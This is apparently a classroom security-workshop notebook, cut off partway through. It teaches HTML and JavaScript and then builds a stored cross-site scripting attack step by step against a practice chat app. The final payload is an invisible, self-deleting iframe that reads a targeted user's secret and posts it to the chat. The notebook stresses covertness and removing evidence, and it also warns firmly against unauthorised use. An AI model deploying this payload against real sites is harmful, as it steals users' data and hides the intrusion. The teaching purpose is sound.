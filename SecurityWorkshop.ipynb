{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "db2469ad",
   "metadata": {},
   "source": [
    "# Introduction\n",
    "Hello! Today we're going to hack a website.\n",
    "Here's a rough outline:\n",
    "- How do I use this environment?\n",
    "- How do computer systems get attacked?\n",
    "- The target\n",
    "- Attack 1: Client-side code injection\n",
    "- Attack 2: Server-side code injection\n",
    "- Wrap-up"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "5f8df3b4",
   "metadata": {},
   "source": [
    "# How do I use this environment?\n",
    "Welcome to your very own 'Jupyter notebook'!\n",
    "\n",
    "A Jupyter notebook is a web environment for mixing pieces of code and text. It's made up of cells. Each cell either contains 'markdown' (text written with extra markings to add headings, boldness, images, etc.) or 'python' code by default. For example this is currently a markdown cell. Code cells can also have 'HTML' or 'JavaScript' in them. Don't worry if you don't know much about 'python'. You won't actually have to write any. Don't worry if you don't know much about 'HTML' or 'JavaScript'. We'll only use it a little and teach you what you need!\n",
    "\n",
    "If you double click on a cell you can edit its contents. When you double click on this cell you'll see the markdown written to render this text.\n",
    "\n",
    "When you're inside a markdown cell editing it, you can press **Shift + Enter** to render the markdown into pretty looking text. If you're inside a code cell you can press **Shift + Enter** to run the code.\n",
    "\n",
    "We'll put a python cell below. Try editing it to include your name where it currently says `yourname` then pressing **Shift + Enter** to run it."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "id": "e911a306",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Hello yourname!\n"
     ]
    }
   ],
   "source": [
    "my_name = \"yourname\"\n",
    "print(\"Hello \"+my_name+\"!\")"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "dc8058ae",
   "metadata": {},
   "source": [
    "You'll mostly just need to run cells for this workshop. No need to create new ones or delete them. You can re-run cells as many times as you like. The Jupyter environment will maintain a global state that continues in the background between all your cells. Try running the cells below in different orders to change what's printed."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "id": "8fe780b6",
   "metadata": {},
   "outputs": [],
   "source": [
    "most_recently_run = \"upper cell\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "id": "eb5a7a23",
   "metadata": {},
   "outputs": [],
   "source": [
    "most_recently_run = \"lower cell\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "id": "d7c209ce",
   "metadata": {
    "scrolled": true
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "You most recently ran the lower cell\n"
     ]
    }
   ],
   "source": [
    "print(\"You most recently ran the \" + most_recently_run)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "b613bd2f",
   "metadata": {},
   "source": [
    "# How do computer systems get attacked?\n",
    "To defend systems, the big question to answer is:\n",
    "- **How** might someone conduct an attack?\n",
    "\n",
    "Understanding the **how** of a threat is crucial to defending against it. For example, in the physical world we might know that thieves can get into houses by looking for and finding hidden spare keys. Since we know the **how** of the threat we can mitigate against it by putting our spare key in a lockbox.\n",
    "\n",
    "So how do computer systems get attacked? Unfortunately there's no one straightforward answer. There are many different kinds of systems that get attacked in many different ways. In fact, sometimes it's not clear where legitimate, if somewhat creative, usage of a system ends and 'hacking' begins. Nonetheless cyber attacks almost always have the property that they **use a system in a way the creator or owner did not intend and has not authorised** and usually this is done **by finding a flaw, or *vulnerability*, in a system which leads to unexpected behaviour and using it creatively, or *exploiting it* with an *exploit***.\n",
    "\n",
    "**Note:** *The word hacking has a few different meanings apart from the cyber attack meaning. For example you can 'hack away' at some code, meaning just writing and tweaking some computer code (legitimately) to get it to work. It's usually clear from context what people mean.*\n",
    "\n",
    "One common kind of flaw is when a system that takes user input **inadvertently allows the user input to be interpreted by the machine as additional software instructions**.\n",
    "\n",
    "This is a little like if at a fancy restaurant when you were given the bill, rather than just putting your card next to it, you removed the bill and put in your own copy of the bill on which everything was cheaper. The system (the waiter) expects your input to be valid (a credit card) but when you're somewhat creative you change the system's (the waiter's) code (bill), so it behaves in a way (charges you less) that it's developer (manager) doesn't intend or authorise.\n",
    "\n",
    "The mistake that makes this possible is unintentional on the part of the application developer (the manager didn't think to tell the waiter to check the restaurant patron hadn't swapped the bill), but abusing that mistake to achieve nefarious ends is most certaintly intentional on the part of the attacker (you definitely meant to swap out the bill to pay less!).\n",
    "\n",
    "This might be a little confusing or vague at this point. Don't worry! We're going to explore this idea better in not one but two hands-on attacks. That is, we're going to hack a website. Twice. \n",
    "\n",
    "But I hear you ask, aren't we the good guys? Indeed we are. But it's not that unusual for the good guys to do some hacking **of their own systems**. Defenders will attack their own websites/software/networks, or bring in teams of friendly attackers to do it, in order to understand the potential vulnerabilities *before* a real malicious attacker exploits them.\n",
    "\n",
    "And thus, for the rest of the workshop we're going to put ourselves in the shoes of would-be attackers."
   ]
  },
  {
   "cell_type": "markdown",
   "id": "cbb1034d",
   "metadata": {},
   "source": [
    "# The Target\n",
    "\n",
    "**Note:** *Consider any data you enter into the target public! It's going to be attacked I'm afraid!*\n",
    "\n",
    "Today we'll be hacking a simple chat app called 'BeeSecure'. Head to http://bee-secure.herokuapp.com and sign up for an account. Make sure you put in a 'secret' that you're happy for potential hackers to find! Explore the features of the website and start chatting with your classmates.\n",
    "\n",
    "Once you're comfortable with the website we'll start hacking!\n",
    "\n",
    "We'll investigate two attacks:\n",
    "1. Client-Side Code Injection (a 'cross-site scripting' attack)\n",
    "2. Server-Side Code Injection (an 'SQL injection' attack)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "8206b409",
   "metadata": {},
   "source": [
    "# Very Important Note\n",
    "\n",
    "The techniques we'll be teaching you today may be a **crime** if directed against a system you're not authorised to attempt them on. **DO NOT** use these techniques, or any other hacking techniques, on systems you are not **explicitly authorised** to use them on.\n",
    "\n",
    "To be *really clear*, once again: using these techniques on systems you don't have permission to try them on may be a **crime**.\n",
    "\n",
    "People have been known to accidentally cross the line from legal to illegal inadvertanetly with just a few button clicks. **DO NOT** look for the line. **DO NOT** push the boundaries.\n",
    "\n",
    "**DO NOT** use these techniques on websites or systems you are not **explicitly authorised** to use them on.\n",
    "\n",
    "With that (hopefully very sobering) warning (filled with gravitas), let's look at the first attack!"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "6af86729",
   "metadata": {},
   "source": [
    "# Attack 1: Client-Side Code Injection"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "a4dc48b5",
   "metadata": {},
   "source": [
    "When you go to a website two computers are involved:\n",
    "- Yours: A **Client**\n",
    "- The Website's: The **Server**\n",
    "\n",
    "But it's usually not just you who accesses a particular website. Other people do: other clients. In fact data you enter into the website is shown on other people's computers after going through the server. For BeeSecure it's your messages that show up on other people's computers. Can we trick other people's computers, that is other clients, into reading our messages to them as code?\n",
    "\n",
    "This kind of attack might be called a 'Client-Side Code Injection' attack since we're injecting code (via the website server) into other clients. It's also often called a '[Cross-Site Scripting](https://www.cloudflare.com/en-gb/learning/security/threats/cross-site-scripting/)' (shortened to XSS when written) attack.\n",
    "\n",
    "To do this we need to understand what 'code' even looks like in our context. "
   ]
  },
  {
   "cell_type": "markdown",
   "id": "afd6b322",
   "metadata": {},
   "source": [
    "## Background and Basics \n",
    "\n",
    "### HTML\n",
    "\n",
    "Without closing this notebook, open up the target website, sign in, send a couple of chat messages, then right click anywhere, and select 'View Source' or 'View Page Source' in the drop down menu. If you can't see the right button to click ask for help. What you're seeing is **H**yper **T**ext **M**arkup **L**anguage or (HTML).\n",
    "\n",
    "**Excercise**\n",
    "- Can you see anything in the HTML that matches the rendered webpage you saw before?\n",
    "  - Can you see any bits of text that look familiar?\n",
    "\n",
    "Lots of HTML is just the text that appears on the webpage with added aesthetic (like colours, fonts, images etc.) and functional (links, search bars etc.) elements you normally see or interact with described in code (or perhaps more precisely in 'markup').\n",
    "\n",
    "If you take a look through you might notice HTML 'tags' of the form:\n",
    "```\n",
    "<name-of-tag>\n",
    "Some stuff inside the tag\n",
    "</name-of-tag>\n",
    "```\n",
    "Everything in HTML is inside a 'tag'. These tags change how what's 'inside' of them looks and behaves. There are tags to create tables, forms, images, videos, sound, and more. Tagged pieces of HTML begin with `<name-of-the-tag>` then contain contents (which often involves other tags!) then the end tag `</name-of-the-tag>`.\n",
    "\n",
    "One simple kind of tag is the 'heading' tag. Starting from `h1` going down to `h6` these tags change the text inside to look like a heading. Look at the HTML code below, then run the cell to see it render."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 54,
   "id": "40d1955a",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<h1>Heading One</h1>\n",
       "<h2>Heading Two</h2>\n",
       "<h3>Heading Three</h3>\n",
       "<h4>Heading Four</h4>\n",
       "<h5>Heading Five</h5>\n",
       "<h6>Heading Six</h6>\n",
       "Normal Text\n"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "%%html\n",
    "<h1>Heading One</h1>\n",
    "<h2>Heading Two</h2>\n",
    "<h3>Heading Three</h3>\n",
    "<h4>Heading Four</h4>\n",
    "<h5>Heading Five</h5>\n",
    "<h6>Heading Six</h6>\n",
    "Normal Text"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "aa8df9e0",
   "metadata": {},
   "source": [
    "Exactly what different size headings look like varies from website to website. Check out [**C**ascading **S**tyle **S**heets](https://developer.mozilla.org/en-US/docs/Learn/CSS/First_steps/What_is_CSS) (often shortened to CSS) if you're interested!\n",
    "\n",
    "There are some tags, like image tags, in which having content or text inside doesn't really make sense. An image is an image. These tags will be a standalone tag. For example:\n",
    "```\n",
    "<img src=\"http://url.com/image.png\" width=100 height=100 />\n",
    "```\n",
    "You still have the `<>` brackets and the tag name `img`, but there's just one set that ends with `/>` instead of just `>`. That is there's no `<img ..> </img>`, just a single `<img .. />`. Inside the tag is given **attributes** that control its behaviour. In this example an image tag needs to know where to go to get the image. It can optionally be given a width and/or height too to control its size.\n",
    "\n",
    "These attributes aren't just for image tags or tags without any contents. Almost all tags have attributes that can be set to do interesting things.\n",
    " \n",
    "Run the cell below to render an example image tag:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 55,
   "id": "7b94b2eb",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<img src=\"https://upload.wikimedia.org/wikipedia/commons/thumb/8/85/Smiley.svg/1200px-Smiley.svg.png\" width=100 height=100/>\n"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "%%html\n",
    "<img src=\"https://upload.wikimedia.org/wikipedia/commons/thumb/8/85/Smiley.svg/1200px-Smiley.svg.png\" width=100 height=100/>"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "e130862b",
   "metadata": {},
   "source": [
    "This is all good and well, but what does HTML have to do with attacking BeeSecure?\n",
    "\n",
    "Plenty.\n",
    "\n",
    "When you clicked 'view source' earlier, the HTML you were shown was the original handed to your computer by the server. When the page first loads it has no messages. When you send or receive messages the rendered webpage *changes* to include them. This means the version of the HTML stored in your web browser's memory changes from the original sent to it initially by the server. This version of the webpage's current state is called the **D**ocument **O**bject **M**odel or **DOM** for short. The DOM is *changing* in repsonse to *another user's* message.\n",
    "\n",
    "But of course this means *your messages* are *changing* the DOM of *other user's* browsers that you're chatting with.\n",
    "\n",
    "The DOM which contains HTML.\n",
    "\n",
    "Most of your messages have just been text that ends up inside some container HTML inside the DOM. But HTML is not so different from text. Perhaps the creators of BeeSecure haven't been careful? Can we get some arbitrary HTML added to the DOM?\n",
    "\n",
    "**Excercise**\n",
    "- What happens if you include some opening and closing HTML tags with content inside in a message? Try `<h1>Some text here</h1>`. What happens?\n",
    "- Can you find a (G-rated) image online and send it to the group with an `img` tag?\n",
    "- *Bonus*: Can you figure out how to [Rickroll](https://en.wikipedia.org/wiki/Rickrolling) everyone in the chat? You can either use a link or try and get the video to display directly with a `video` tag."
   ]
  },
  {
   "cell_type": "markdown",
   "id": "cd170b5f",
   "metadata": {},
   "source": [
    "Great! We can send more complex messages than the creators of the site intended. Making super cool messages to send to my friends is fun, but can do I anything more powerful?\n",
    "\n",
    "The answer is a definite **yes**. To do that, we need to learn about JavaScript."
   ]
  },
  {
   "cell_type": "markdown",
   "id": "e851ce1b",
   "metadata": {},
   "source": [
    "### JavaScript\n",
    "If HTML describe what's on a webpage, and CSS describes how it looks, **JavaScript describes how it behaves**. Modern websites do all sorts of clever things, from sorting lists of products on the fly, to running full blown games. These kinds of applications require webpages to *do things*. They need to run code locally on the client. JavaScript is the coding language that modern webbrowsers can all run. Within JavaScript we can communicate with servers on the internet, accept user input, and crucially **read or modify the DOM** (remember this is the web-browser's internal model of the website) as we go.\n",
    "\n",
    "Below we ask Jupyter notebook to run a very simple line of JavaScript on this webpage which calls the built-in `alert` function. Run it and see what happens!"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 56,
   "id": "bbc76769",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "application/javascript": [
       "\n",
       "alert(\"This is a dialog box!\");\n"
      ],
      "text/plain": [
       "<IPython.core.display.Javascript object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "%%js\n",
    "\n",
    "alert(\"This is a dialog box!\");"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "121c7897",
   "metadata": {},
   "source": [
    "To include javascript inside of HTML we can use a script tag:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 57,
   "id": "dc28c24f",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "\n",
       "<script>alert(\"This is (still) a dialog box!\");</script>\n"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "%%html\n",
    "\n",
    "<script>alert(\"This is (still) a dialog box!\");</script>"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "33ad818e",
   "metadata": {},
   "source": [
    "So in theory since we can make other client web browsers (i.e. our classmates' web browsers!) interpret arbitrary HTML, we should be able to use `<script>` tags to run arbitrary JavaScript right?\n",
    "\n",
    "**Excercise**\n",
    "- Send a script tag with an alert in it in the chat. Did it work?"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "7500ac5e",
   "metadata": {},
   "source": [
    "Unfortunately it seems that sending a script tag doesn't work! This is often the case when we're exploiting a vulnerability. Because we're using a system in an unexpected way there'll be different quirks and obstacles that pop-up. Part of being a good vulnerability researcher/exploit developer is being able to cope with this and keep going. So let's do that.\n",
    "\n",
    "We might hypothesise that if script tags don't work, maybe it's because when they get added to the DOM they're not \n",
    "automatically run?\n",
    "\n",
    "Perhaps script tags need to be sent in the initial HTML to be run?\n",
    "\n",
    "We're not certain if this is right or not and that's ok. It's a hypothesis after all. We could investigate this further if we needed or wanted to, but for the moment we're going to continue trying to develop our exploit based on this hypothesis. So we need to find another way to run JavaScript from HTML that doesn't involve `script` tags. Thankfully we've found one ahead of time for you."
   ]
  },
  {
   "cell_type": "markdown",
   "id": "5bdb345e",
   "metadata": {},
   "source": [
    "### HTML Event Attributes\n",
    "\n",
    "Often webpages do things in response to **events**. The user clicks a button, a form is submitted, or a particular part of the webpage has experienced an error. These events can have pieces of JavaScript code attached which the browser will run when the relevant events occur. Attaching code to events can happen from within JavaScript, or *from within the HTML itself* by using **HTML Event Attributes**.\n",
    "\n",
    "We talked about attributes of HTML tags earlier. If you remember our image example we had `src`, `width`, and `height` attributes:\n",
    "```\n",
    "<img src=\"http://url.com/image.png\" width=100 height=100 />\n",
    "```\n",
    "Event attributes are very similar except rather than having a URL or a number as their argument, they take a string of JavaScript code to execute when the relevant event occurs.\n",
    "\n",
    "There's a list of event attributes [here](https://www.w3schools.com/tags/ref_eventattributes.asp). One that seems particularly useful is `onload` which on certain tags will run after the content of the tag is loaded. That's handy because surely tags need to be loaded to be rendered, and the tags we're sending in our messages are definitely being rendered. \n",
    "\n",
    "But which tag shall we use? To save you time we've experimented and figured out a good tag to use is the `iframe` tag. The `iframe` tag is normally used to put a small version of another webpage inside your own with its URL provided in the `src` attribute. For example:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 58,
   "id": "64da4509",
   "metadata": {
    "scrolled": true
   },
   "outputs": [
    {
     "data": {
      "text/html": [
       "\n",
       "<iframe src=\"http://en.wikipedia.org\">\n"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "%%html\n",
    "\n",
    "<iframe src=\"http://en.wikipedia.org\">"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "96f9c29e",
   "metadata": {},
   "source": [
    "We've just put a small version of Wikipedia inside our Jupyter notebook! Ok, so we look to be just about ready to inject some JavaScript code to run on other client machines. Let's do that below."
   ]
  },
  {
   "cell_type": "markdown",
   "id": "941389a0",
   "metadata": {},
   "source": [
    "## Creating  a POC\n",
    "Now we can create a basic **P**roof-**O**f-**C**oncept (POC) using the HTML event attributes on an `iframe`.\n",
    "\n",
    "**Excercise**\n",
    "- Try and send a `iframe` start and end tag in the chat with no content inside, and use the `onload` attribute to create an alert box on everyone else's machine (look up earlier in this notebook to see how to do this). If you get stuck, ask one of your instructors for a tip!\n",
    "  - **A quick gotcha**, if you use `\"` in HTML to contain your code string, then you can't use `\"` *inside* the string itself. Whenever you would would have used a `\"` in your JavaScript, try using a `'` instead. Having to avoid using particular characters is very common in exploit development. \n",
    "\n",
    "Scroll down when you're done with the excercise to see the solution and move on to the next step...\n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "\n",
    "...and we continue!"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "1108664e",
   "metadata": {},
   "source": [
    "Hopefully you should've have something that looked a little like what's shown below."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 59,
   "id": "36bf39c8",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "\n",
       "<iframe onload=\"alert('Haha your machine is mine!');\" src=\"http://en.wikipedia.org\"></iframe>\n"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "%%html\n",
    "\n",
    "<iframe onload=\"alert('Haha your machine is mine!');\" src=\"http://en.wikipedia.org\"></iframe>"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "0687b444",
   "metadata": {},
   "source": [
    "## Exploit Development\n",
    "\n",
    "We've caused some chaos and demonstrated we can run JavaScript code on other client machines. Can we go beyond our POC? Can we do something a little more clever for our 'actual' attack? Let's workshop our exploit *payload* inside of Jupyter to improve it before returning to the chat app later.\n",
    "\n",
    "The pace will pick up a little bit at this point. Don't worry if you don't quite grasp all the details. If you've understood to this point you've gotten the core ideas of the attack. We have to move fast without very careful or detailed explanations to see the full attack in our short session! Feel free to ask questions :)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "431b529f",
   "metadata": {},
   "source": [
    "### Being sneakier\n",
    "\n",
    "Let's make our attack a little more covert and harder to spot.\n",
    "\n",
    "At the moment users see a piece of Wikipedia or another website appear when we send our attack. That's more than a little suspicious.\n",
    "\n",
    "We can use the `style` attribute to add some of that CSS we mentioned earlier to make the `iframe` invisible. We'll just make the size of the `iframe` zero and make the border of size zero as well. We can also put in some non-suspicious text, since an empty message is also a little suspicious. "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 60,
   "id": "cf2f3007",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "\n",
       "<iframe onload=\"alert('Haha your machine is mine!');\" style=\"width:0;height:0;border:0;\" src=\"http://en.wikipedia.org\"></iframe>Hello friends!\n"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "%%html\n",
    "\n",
    "<iframe onload=\"alert('Haha your machine is mine!');\" style=\"width:0;height:0;border:0;\" src=\"http://en.wikipedia.org\"></iframe>Hello friends!"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "eb3f1259",
   "metadata": {},
   "source": [
    "Let's make or exploit even sneakier. Let's have the `iframe` delete itself once it's done. This has two advantages:\n",
    "1. It means our malicious code will only run once. Currently every time the `iframe` is reloaded in the DOM, its `onload` event triggers and our code will re-run. You've probably the noticed the mess this is causing in the chat app. We want our attack to be more controlled and selective. If the `iframe` deletes itself from the DOM after its first run, even when the DOM reloads our code won't be run again.\n",
    "2. It means there's less evidence of our attack that might allow it to be identified or inspected. Currently our `iframe`, whilst invisible to an everyday user, is sitting in the DOM which is not hard to 'Inspect' in most modern web browsers if you know what you're doing. Let's scrap (some of) the evidence!\n",
    "\n",
    "To delete the `iframe` we need to modify the DOM from our JavaScript code. Thankfully JavaScript is designed with modifying the DOM as one its primary purposes. We can give our `iframe` an **`id` attribute** equal to a simple string. We'll use `myexploitid` but pick something unique when you conduct the attack. This can then be used in our code to get a handle to it in the DOM. We store this handle in a variable we call `thisFrame`:\n",
    "```javascript\n",
    "var thisFrame = document.getElementById('myexploitid');\n",
    "```\n",
    "Then we can delete the DOM element stored in `thisFrame` it with the following snippet:\n",
    "```javascript\n",
    "thisFrame.parentNode.removeChild(thisFrame);\n",
    "```\n",
    "\n",
    "Putting this together we get (we've moved things on to different lines to make everything easier to see):"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 61,
   "id": "c7c7753a",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "\n",
       "<iframe\n",
       "id=\"myexploitid\"\n",
       "style=\"width:0;height:0;border:0;\"\n",
       "src=\"http://en.wikipedia.org\"\n",
       "onload=\"\n",
       "    alert('Haha your machine is mine!');\n",
       "    var thisFrame = document.getElementById('myexploitid');\n",
       "    thisFrame.parentNode.removeChild(thisFrame);\n",
       "\"\n",
       ">\n",
       "</iframe>\n",
       "Hello friends!\n"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "%%html\n",
    "\n",
    "<iframe\n",
    "id=\"myexploitid\"\n",
    "style=\"width:0;height:0;border:0;\"\n",
    "src=\"http://en.wikipedia.org\"\n",
    "onload=\"\n",
    "    alert('Haha your machine is mine!');\n",
    "    var thisFrame = document.getElementById('myexploitid');\n",
    "    thisFrame.parentNode.removeChild(thisFrame);\n",
    "\"\n",
    ">\n",
    "</iframe>\n",
    "Hello friends!"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "cda17570",
   "metadata": {},
   "source": [
    "This won't look very different but it will behave more reliably and leave less evidence to find!\n",
    "\n",
    "*Bonus*: When we say less evidence, we mean in the DOM. If you right click and select 'Inspect' or 'Inspect Element' to see the DOM you'll notice there's no `iframe` there on this latest example inside our Jupyter notebook. Just the text. This is unlike our earlier examples, if you use 'Inspect' on them you'll see left a suspicious looking `iframe` with our even more suspicious looking malicious JavaScript.\n",
    "\n",
    "Perfect, now our malicious message looks just like any other. But ours will run whatever JavaScript code we'd like to run on all the client machines that connect to the website. "
   ]
  },
  {
   "cell_type": "markdown",
   "id": "34c1a777",
   "metadata": {},
   "source": [
    "### Scrapping Deadweight\n",
    "\n",
    "Our next change is a very minor one. You might notice a brief delay for our pop-up to appear. That's because the `iframe` has to load Wikipedia first. We don't actually need Wikipedia, in fact it's slowing us down and leaving more evidence. Let's just scrap the `src` attribute and see if things work faster.\n",
    "\n",
    "*Bonus*: Leaving in `src` adds more evidence because an attentive user looking through the 'Inspect' tabs will spot a network connection out to Wikipedia. This is obviously suspicious behaviour when you're on a chat app that has nothing to do with Wikipedia. "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 62,
   "id": "220d2638",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "\n",
       "<iframe\n",
       "id=\"myexploitid\"\n",
       "style=\"width:0;height:0;border:0;\"\n",
       "onload=\"\n",
       "    alert('Haha your machine is mine!');\n",
       "    var thisFrame = document.getElementById('myexploitid');\n",
       "    thisFrame.parentNode.removeChild(thisFrame);\n",
       "\"\n",
       ">\n",
       "</iframe>\n",
       "Hello friends!\n"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "%%html\n",
    "\n",
    "<iframe\n",
    "id=\"myexploitid\"\n",
    "style=\"width:0;height:0;border:0;\"\n",
    "onload=\"\n",
    "    alert('Haha your machine is mine!');\n",
    "    var thisFrame = document.getElementById('myexploitid');\n",
    "    thisFrame.parentNode.removeChild(thisFrame);\n",
    "\"\n",
    ">\n",
    "</iframe>\n",
    "Hello friends!"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "d0c60960",
   "metadata": {},
   "source": [
    "That's worked well!"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "3c7b6ca8",
   "metadata": {},
   "source": [
    "#### The pointy end\n",
    "Ok so we now have an invisible HTML element that will quickly run whatever JavaScript we like then delete itself. What can we do with this? What will the pointy end of our attack be? Steal people's secrets of course!\n",
    "\n",
    "We've done the rest of the work for you. The below snippet will check the username in the DOM of the client it's running on, see if it's the chosen target, and if it is, retrieve their secret from the DOM and send it out as a message.  \n",
    "```javascript\n",
    "var target = 'VictimsUsername';\n",
    "var username = document.getElementById('username').textContent;\n",
    "if (username == target) {\n",
    "  var secret = document.getElementById('secret').textContent;\n",
    "  socket.emit('message',{msg:secret});\n",
    "}\n",
    "```\n",
    "*Bonus*: To do this we had to reverse engineer the webpage somewhat. If you're looking for a challenge identify which parts of the webpage in the DOM we're using to get the information we wanted. We also had to figure out how messages get sent to the chat and retrofit that for our own purposes. How did we figure out how to send a message to the chat from JavaScript based on the original website?\n",
    "\n",
    "#### Putting it all together!\n",
    "\n",
    "This will no longer work in the Jupyter notebook because it depends on the details of BeeSecure. The complete attack is shown below. Select a victim, put their username into the `target` variable instead of the current placeholder, make sure you change `myexploitid` to a custom value (In both places! It appears twice!), choose your own non-suspicious message, and launch your attack to have your victim's secret sent to everyone in the chat.\n",
    "```HTML\n",
    "<iframe\n",
    "id=\"myexploitid\"\n",
    "style=\"width:0;height:0;border:0;\"\n",
    "onload=\"\n",
    "    var target = 'VictimsUsername';\n",
    "    var username = document.getElementById('username').textContent;\n",
    "    if (username == target) {\n",
    "      var secret = document.getElementById('secret').textContent;\n",
    "      socket.emit('message',{msg:secret});\n",
    "    };\n",
    "    var thisFrame = document.getElementById('myexploitid');\n",
    "    thisFrame.parentNode.removeChild(thisFrame);\n",
    "\"\n",
    ">\n",
    "</iframe>\n",
    "My non-suspicious message here..\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "8c81b69e",
   "metadata": {},
   "source": [
    "## Summary\n",
    "We've:\n",
    "- Seen the basics of HTML, JavaScript, HTML Event Attributes, and the Document Object Model (or DOM)\n",
    "- Identified a vulnerability where our input to the server is not carefully checked and allows us to modify the DOM of other clients in dangerous ways\n",
    "- Developed a Proof-Of-Concept, or POC, turning our DOM modification into an ability to run arbitrary code in JavaScript\n",
    "- Developed an exploit based off our POC that covertly(ish) and in a targeted way steals secrets from a chosen victim."
   ]
  },
  {
   "cell_type": "markdown",
   "id": "7f357496",
   "metadata": {},
   "source": [
    "# Attack 2: Server-Side Code Injection"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "1ec381db",
   "metadata": {},
   "source": [
    "Ok so we've been able to send messages to other **client** machines and execute JavaScript. This lets us do lots of interesting nefarious things. Can we do something similar for the **server**? \n",
    "\n",
    "It might seem a little odd, but to answer this question we need to understand what a **database** is, in particular what **SQL** is, and how they both tend to be used."
   ]
  },
  {
   "cell_type": "markdown",
   "id": "5b80abc4",
